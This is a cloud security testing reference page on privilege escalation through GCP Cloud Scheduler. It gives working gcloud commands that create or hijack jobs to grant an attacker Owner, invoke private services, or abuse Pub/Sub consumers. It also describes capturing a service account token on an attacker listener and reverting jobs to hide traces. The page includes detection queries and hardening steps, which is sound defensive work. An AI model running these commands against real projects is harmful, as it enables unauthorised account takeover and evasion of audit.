---
cstg_id: CSTG-GCP-CLOUD-SCHEDULER-PRIVESC
title: "GCP Cloud Scheduler - Privilege Escalation"
provider: gcp
service: cloud-scheduler
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - cloudscheduler.jobs.create
  - cloudscheduler.jobs.update
  - cloudscheduler.jobs.run
  - iam.serviceAccounts.actAs
references:
  - https://cloud.google.com/scheduler/docs/http-target-auth
  - https://cloud.google.com/scheduler/docs/reference/rest/v1/projects.locations.jobs
  - https://cloud.google.com/iam/docs/service-account-permissions
  - https://cloud.google.com/iam/docs/roles-permissions/cloudscheduler
  - https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
  - https://hackingthe.cloud/gcp/
license: CC BY-SA 4.0
---

## Summary

Cloud Scheduler privilege escalation hinges on one fact: a scheduler job runs **as a service account**, not as the principal who created or triggered it. A job's `httpTarget.oauthToken`/`httpTarget.oidcToken` (or a Pub/Sub/App Engine target) lets the job authenticate to a destination using the attached service account's identity. A principal who can create or modify a job, attach a more-privileged service account, point it at a target of their choosing, and trigger it on demand has effectively obtained the ability to act as that service account - without ever holding `iam.serviceAccounts.getAccessToken` directly.

The escalation primitive is therefore a chain of two requirements:

1. Write/run access to scheduler jobs (`cloudscheduler.jobs.create`, `.update`, and/or `.run`), and
2. The ability to attach the target service account, which requires `iam.serviceAccounts.actAs` on that service account.

When both hold for a service account more privileged than the current principal, the job becomes a proxy that wields the higher privilege. This page documents the variations by which permission is converted into impact.

## Prerequisites

- Assumed-breach foothold: credentials for a principal in the project (user, service account, or workload identity).
- Cloud Scheduler API enabled.
- Knowledge of candidate service accounts and their privileges - see [GCP Cloud Scheduler enumeration](../02-services/gcp-cloud-scheduler-enum.md) and project IAM enumeration.
- For attaching an SA to a job: `iam.serviceAccounts.actAs` on that SA (granted by `roles/iam.serviceAccountUser` on the SA or project, among others).

## Enumeration

Before attempting escalation, determine what is reachable:

```bash
# Which scheduler permissions does the current principal hold?
gcloud projects get-iam-policy "$PROJECT" --format=json \
  | jq '.bindings[] | select(.role | test("cloudscheduler|iam.serviceAccountUser|editor|owner"))'

# Service accounts the principal can actAs (testable via IAM policy or testIamPermissions)
gcloud iam service-accounts list --project "$PROJECT"
for SA in $(gcloud iam service-accounts list --project "$PROJECT" --format="value(email)"); do
  gcloud iam service-accounts get-iam-policy "$SA" --format=json 2>/dev/null \
    | jq --arg sa "$SA" '{sa:$sa, bindings:[.bindings[]? | select(.role|test("serviceAccountUser|actAs|admin"))]}'
done
```

Identify the highest-privileged SA for which the principal has `actAs`. That SA is the escalation vehicle.

## Exploitation

The general pattern: create or modify a job whose attached identity is the high-privilege SA and whose target performs a privileged action, then run the job immediately with `jobs.run` rather than waiting for the schedule.

### cloudscheduler.jobs.create + iam.serviceAccounts.actAs

Create a new HTTP job that uses the target SA's OAuth token to call a Google API. The OAuth token is minted for the SA and sent as the `Authorization` header to the target host. By pointing the job at a Google API endpoint and supplying a body, the job executes an authenticated API call as that SA.

Example - grant the attacker's own principal a role using the target SA's credentials, by calling the Resource Manager `setIamPolicy` API from the job:

```bash
# Build a request body that adds the attacker as Owner (read current policy first, merge, then submit)
BODY=$(jq -nc --arg member "user:attacker@example.com" '
  {policy:{bindings:[{role:"roles/owner",members:[$member]}]}}')

gcloud scheduler jobs create http privesc-job \
  --location "$LOC" --project "$PROJECT" \
  --schedule="* * * * *" \
  --uri="https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT:setIamPolicy" \
  --http-method=POST \
  --headers="Content-Type=application/json" \
  --message-body="$BODY" \
  --oauth-service-account-email="$HIGH_PRIV_SA"

# Trigger immediately instead of waiting for the cron tick
gcloud scheduler jobs run privesc-job --location "$LOC" --project "$PROJECT"
```

The Cloud Scheduler service mints an OAuth access token for `$HIGH_PRIV_SA` (subject to the attacker holding `actAs` on it) and sends the request with that token. If the SA can modify the project IAM policy, the attacker gains the granted role. The same primitive works against any Google API the SA is authorised for: minting service-account keys (`iam.serviceAccounts.keys.create`), creating tokens, deploying compute, reading buckets, etc. To exfiltrate an access token directly rather than perform a single action, point the job at an attacker-controlled HTTPS endpoint and use `--oauth-token-scope`; the SA's bearer token arrives in the inbound `Authorization` header captured by the listener.

### cloudscheduler.jobs.update + iam.serviceAccounts.actAs

Where job creation is restricted but an existing job can be edited, hijack a benign job. Repoint its `uri`, swap its body/headers, and/or change its attached SA to a more privileged one, then run it.

```bash
gcloud scheduler jobs update http existing-job \
  --location "$LOC" --project "$PROJECT" \
  --uri="https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT:setIamPolicy" \
  --http-method=POST \
  --message-body="$BODY" \
  --oauth-service-account-email="$HIGH_PRIV_SA"

gcloud scheduler jobs run existing-job --location "$LOC" --project "$PROJECT"
```

Updating a job is also a stealthier escalation than creating one, and reverting the definition afterward reduces forensic footprint. Note: the same job can be restored to its original target after the privileged call lands.

### cloudscheduler.jobs.run (existing privileged job)

If the current principal cannot attach an SA but a job already exists that is bound to a privileged SA and points at a sensitive or attacker-influenceable target, simply running it on demand executes the privileged action immediately rather than at the next scheduled time. This requires only `cloudscheduler.jobs.run` and no `actAs`, because the SA binding already exists on the job. The escalation value depends entirely on what the existing job does; jobs that publish to a Pub/Sub topic feeding a privileged consumer, or that invoke an admin endpoint, are the prime candidates.

### OIDC-token jobs against Cloud Run / Cloud Functions

For targets that validate an OIDC identity token (Cloud Run services, 2nd-gen Cloud Functions, IAP-fronted apps), use `--oidc-service-account-email` and `--oidc-token-audience`. The job mints an identity token for the SA with the specified audience. If the SA is permitted to invoke a private Cloud Run service (`roles/run.invoker`) that the attacker otherwise cannot reach, the job invokes it as the SA - useful for reaching internal admin functions or services that perform privileged side effects.

```bash
gcloud scheduler jobs create http invoke-private \
  --location "$LOC" --project "$PROJECT" \
  --schedule="* * * * *" \
  --uri="https://private-svc-xxxx.a.run.app/admin/action" \
  --http-method=POST \
  --oidc-service-account-email="$RUN_INVOKER_SA" \
  --oidc-token-audience="https://private-svc-xxxx.a.run.app"
gcloud scheduler jobs run invoke-private --location "$LOC" --project "$PROJECT"
```

### Pub/Sub target abuse

A job with a `pubsubTarget` publishes attacker-controlled `data`/`attributes` to a topic, using the Cloud Scheduler service agent's publish rights. If a privileged subscriber acts on message content (for example a Cloud Function that provisions resources or grants access based on the payload), crafting the message body escalates indirectly through the downstream consumer.

```bash
gcloud scheduler jobs create pubsub trigger-consumer \
  --location "$LOC" --project "$PROJECT" \
  --schedule="* * * * *" \
  --topic="projects/$PROJECT/topics/$PRIV_TOPIC" \
  --message-body='{"action":"grant","principal":"attacker@example.com"}'
gcloud scheduler jobs run trigger-consumer --location "$LOC" --project "$PROJECT"
```

## Misconfigurations & Findings

- A principal holding both `cloudscheduler.jobs.create`/`.update` and `iam.serviceAccountUser` (or narrower `actAs`) on a privileged SA - the complete escalation chain.
- Broadly granted `roles/cloudscheduler.admin` combined with project-level `roles/iam.serviceAccountUser`.
- Existing jobs bound to `roles/owner`/`roles/editor` service accounts that any developer can `jobs.run`.
- Jobs whose targets are sensitive Google API endpoints or privileged internal services.
- Pub/Sub consumers that perform privileged actions based on unauthenticated message content.

## Detection & Logging

All escalation actions here generate Admin Activity Cloud Audit Logs (always enabled):

- `google.cloud.scheduler.v1.CloudScheduler.CreateJob`
- `google.cloud.scheduler.v1.CloudScheduler.UpdateJob`
- `google.cloud.scheduler.v1.CloudScheduler.RunJob`

Correlate with the action performed by the SA on the target service (for example `SetIamPolicy` on Resource Manager, or `CreateServiceAccountKey` on IAM) appearing immediately after a `RunJob`.

```
protoPayload.serviceName="cloudscheduler.googleapis.com"
protoPayload.methodName=("google.cloud.scheduler.v1.CloudScheduler.CreateJob" OR
  "google.cloud.scheduler.v1.CloudScheduler.UpdateJob" OR
  "google.cloud.scheduler.v1.CloudScheduler.RunJob")
```

High-fidelity signals: a `CreateJob`/`UpdateJob` whose `oauthToken`/`oidcToken` service account differs from the principal, a target URI pointing at `*.googleapis.com` admin endpoints, or a `RunJob` followed within seconds by an IAM-modifying call by the attached SA. Alert when the same principal both edits a job and triggers it.

## Remediation & Hardening

- Separate duties: do not grant the same principal both scheduler write access and `iam.serviceAccountUser`/`actAs` over privileged service accounts.
- Attach only least-privilege, single-purpose service accounts to jobs. Never attach `roles/editor`/`roles/owner` SAs.
- Enforce IAM Conditions and Organization Policy (`iam.allowedPolicyMemberDomains`, `iam.disableServiceAccountKeyCreation`) to blunt downstream actions an escalated SA could take.
- Validate Pub/Sub message provenance in consumers; never act on unauthenticated payload contents.
- Require OIDC with a specific audience for HTTP targets and ensure invoked services authorise narrowly.
- Alert on job create/update where the attached SA is more privileged than expected, and on edit-then-run sequences by a single principal.

## Tools

- `gcloud scheduler jobs create|update|run` CLI.
- Cloud Scheduler REST API (`projects.locations.jobs.create/patch/run`).
- IAM policy / `testIamPermissions` for mapping `actAs` reach.
- An attacker-controlled HTTPS listener for OAuth-token capture variants.

## References

- https://cloud.google.com/scheduler/docs/http-target-auth
- https://cloud.google.com/scheduler/docs/reference/rest/v1/projects.locations.jobs
- https://cloud.google.com/iam/docs/service-account-permissions
- https://cloud.google.com/iam/docs/roles-permissions/cloudscheduler
- https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- https://hackingthe.cloud/gcp/
